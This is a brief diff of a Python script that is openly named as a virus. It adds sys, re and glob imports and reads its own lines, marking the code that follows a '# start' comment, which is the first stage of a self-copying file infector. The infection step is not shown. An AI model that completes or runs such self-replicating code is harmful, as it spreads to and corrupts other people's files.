@@ -1,4 +1,7 @@
-print("hello world")# start
+# start
+import sys
+import re
+import glob
 virus = []
 
 # opening
@@ -10,7 +13,6 @@ virusFile.close()
 # save into list
 inVirus = False
 for line in allLines:
-    
     if (re.search("^# start",line)):
         inVirus = True
 
